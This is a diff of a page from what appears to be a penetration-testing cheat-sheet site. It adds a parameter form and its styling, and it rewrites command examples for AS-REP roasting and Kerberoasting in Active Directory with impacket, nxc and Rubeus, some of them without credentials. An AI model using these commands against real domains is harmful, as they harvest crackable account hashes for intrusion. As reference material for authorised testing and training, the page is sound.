@@ -201,8 +201,131 @@
   <li><a href="https://tldrbins.github.io/@getnpusers/">GetNPUsers</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="as_rep-roasting">AS_REP Roasting</h3>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Impacket</button>
@@ -210,17 +333,17 @@
 <button data-tabset="set1" data-tabcontent="tab2" >nxc</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Multiple valid usernames</span>
-</span></span><span class="line"><span class="cl">impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile usernames.txt -no-pass -dc-ip &lt;DC&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Single user without creds</span>
-</span></span><span class="line"><span class="cl">impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 &lt;DOMAIN&gt;/&lt;USER&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Multiple valid usernames
+</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile &lt;USERS_FILE&gt; -no-pass -dc-ip &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Single user without creds
+</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers -no-pass -dc-ip &lt;TARGET&gt; &lt;DOMAIN&gt;/&lt;USER&gt;
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Multiple valid usernames (nxc)</span>
-</span></span><span class="line"><span class="cl">nxc ldap 10.10.11.10 -u usernames.txt -p <span class="s1">&#39;&#39;</span> --asreproast as_rep_hashes.txt
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Multiple valid usernames <span class="o">(</span>nxc<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">nxc ldap &lt;TARGET&gt; -u &lt;USERS_FILE&gt; -p &#39;&#39; --asreproast as_rep_hashes.txt
+</span></span></span></code></pre></div></div>
 </div></p>
 <br>
 <hr>
@@ -231,28 +354,29 @@
 <button data-tabset="set2" data-tabcontent="tab2" >nxc</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Fix time skew</span>
-</span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -request <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;</span> -dc-ip &lt;DC_IP&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Fix <span class="nb">time</span> skew
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs -request &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC_IP&gt;
+</span></span></span></code></pre></div></div>
 <p><small><em>Note: Times skew have to be within 5 minutes in kerberos</em></small></p>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Kerberoasting without cred</span>
-</span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -no-preauth &lt;USER_WITH_DONT_REQUIRE_PREAUTH&gt; -usersfile usernames.txt -dc-host &lt;DC_IP&gt; &lt;DOMAIN&gt;/
-</span></span></code></pre></div></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Kerberoasting without cred
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs -no-preauth &lt;USER_WITH_DONT_REQUIRE_PREAUTH&gt; -usersfile &lt;USERS_FILE&gt; -dc-host &lt;DC_IP&gt; &lt;DOMAIN&gt;/
+</span></span></span></code></pre></div></div></div>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap &lt;DC_IP&gt; -u &lt;UESR&gt; -p &lt;PASSWORD&gt; --kerberoasting kerberoast_hashes.txt
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; --kerberoasting kerberoast_hashes.txt
+</span></span></span></code></pre></div></div>
 </div></p>
 <h3 id="kerberoasting-from-windows">Kerberoasting (From Windows)</h3>
 <p>
 <button data-tabset="set3" data-tabcontent="tab1" class="active">rubeus</button>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">.\rubeus.exe kerberoast /creduser:<span class="p">&lt;</span>DOMAIN<span class="p">&gt;</span>\<span class="p">&lt;</span>USER<span class="p">&gt;</span> /credpassword:<span class="p">&lt;</span>PASSWORD&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe kerberoast /creduser:&lt;DOMAIN&gt;\&lt;USER&gt; /credpassword:&#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div></div>
 </div></p>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
